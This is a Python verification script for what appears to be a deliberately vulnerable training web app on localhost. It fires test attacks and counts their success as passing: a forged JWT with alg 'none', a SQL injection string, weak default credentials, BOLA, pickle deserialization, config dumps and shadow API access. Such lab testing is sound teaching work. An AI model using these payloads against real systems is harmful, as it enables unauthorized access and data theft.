import requests
import jwt
import base64
import pickle
import os

BASE_URL = "http://127.0.0.1:5000"

def log(msg, status="INFO", details=None):
    print(f"[{status}] {msg}")
    if details:
        print(f"   Details: {details[:500]}...") # Truncate long output

def test_broken_auth():
    log("Testing 01 Broken Authentication...")
    # 1. Login
    resp = requests.post(f"{BASE_URL}/vuln/auth", data={"username": "admin", "password": "123456"})
    if "Login Successful" in resp.text:
        log("Login Successful", "PASS")
    else:
        log("Login Failed", "FAIL", f"Status: {resp.status_code}, Body: {resp.text}")

    # 2. BOLA
    resp = requests.post(f"{BASE_URL}/vuln/auth/invoice", data={"invoice_id": "1"})
    if "Sensitive Data for User A" in resp.text:
        log("BOLA Invoice 1 Accessed", "PASS")
    else:
        log("BOLA Invoice 1 Failed", "FAIL", f"Status: {resp.status_code}, Body: {resp.text}")

def test_jwt():
    log("Testing 02 JWT Pitfalls...")
    # 1. Generate
    resp = requests.post(f"{BASE_URL}/vuln/jwt", data={"action": "generate"})
    if "eyJ" in resp.text:
        log("JWT Generation Successful", "PASS")
    else:
        log("JWT Generation Failed", "FAIL", f"Status: {resp.status_code}, Body: {resp.text}")
    
    # 2. Verify None Alg
    # Construct none alg token
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
    payload = base64.urlsafe_b64encode(b'{"sub":"hacker"}').decode().rstrip("=")
    token = f"{header}.{payload}."
    
    resp = requests.post(f"{BASE_URL}/vuln/jwt", data={"action": "verify", "token": token})
    if "Decoded Payload" in resp.text and "hacker" in resp.text:
        log("JWT None Alg Bypass Successful", "PASS")
    else:
        log("JWT None Alg Bypass Failed", "FAIL", f"Status: {resp.status_code}, Body: {resp.text}")

def test_injection():
    log("Testing 03 Injection Attacks...")
    # 1. SQLi
    resp = requests.post(f"{BASE_URL}/vuln/injection", data={"action": "sql", "username": "' OR '1'='1"})
    if "admin" in resp.text and "alice" in resp.text:
        log("SQL Injection Successful", "PASS")
    else:
        log("SQL Injection Failed", "FAIL", f"Status: {resp.status_code}, Body: {resp.text}")

    # 2. Cmd Injection
    # We'll just check if it runs, not the output content too strictly to avoid platform issues, 
    # but 'ping' output should be visible.
    resp = requests.post(f"{BASE_URL}/vuln/injection", data={"action": "cmd", "hostname": "127.0.0.1"})
    if "PING" in resp.text or "bytes from" in resp.text:
        log("Command Injection Successful", "PASS")
    else:
        log("Command Injection Failed (Output might vary)", "WARN", f"Status: {resp.status_code}, Body: {resp.text}")

def test_serialization():
    log("Testing 04 Insecure Deserialization...")
    # 1. Pickle
    # Simple object
    data = pickle.dumps("test_pickle")
    payload = base64.b64encode(data).decode()
    resp = requests.post(f"{BASE_URL}/vuln/serialization", data={"action": "pickle", "payload": payload})
    if "Successfully deserialized object: test_pickle" in resp.text:
        log("Pickle Deserialization Successful", "PASS")
    else:
        log("Pickle Deserialization Failed", "FAIL", f"Status: {resp.status_code}, Body: {resp.text}")

def test_misconfig():
    log("Testing 06 Security Misconfiguration...")
    resp = requests.get(f"{BASE_URL}/vuln/misconfig")
    if "SECRET_KEY" in resp.text and "hardcoded_db_password" in resp.text:
        log("Config Dump Successful", "PASS")
    else:
        log("Config Dump Failed", "FAIL", f"Status: {resp.status_code}, Body: {resp.text}")

def test_api_sprawl():
    log("Testing 08 API Sprawl...")
    # 1. Zombie API
    resp = requests.get(f"{BASE_URL}/api/v1/users")
    if "admin" in resp.text and "superuser" in resp.text:
        log("Zombie API (v1) Accessed", "PASS")
    else:
        log("Zombie API (v1) Failed", "FAIL", f"Status: {resp.status_code}, Body: {resp.text}")
    
    # 2. Shadow API
    resp = requests.get(f"{BASE_URL}/test_debug_endpoint")
    if "system_env" in resp.text:
        log("Shadow API Accessed", "PASS")
    else:
        log("Shadow API Failed", "FAIL", f"Status: {resp.status_code}, Body: {resp.text}")

if __name__ == "__main__":
    try:
        test_broken_auth()
        test_jwt()
        test_injection()
        test_serialization()
        test_misconfig()
        test_api_sprawl()
    except Exception as e:
        log(f"Verification crashed: {e}", "ERROR")
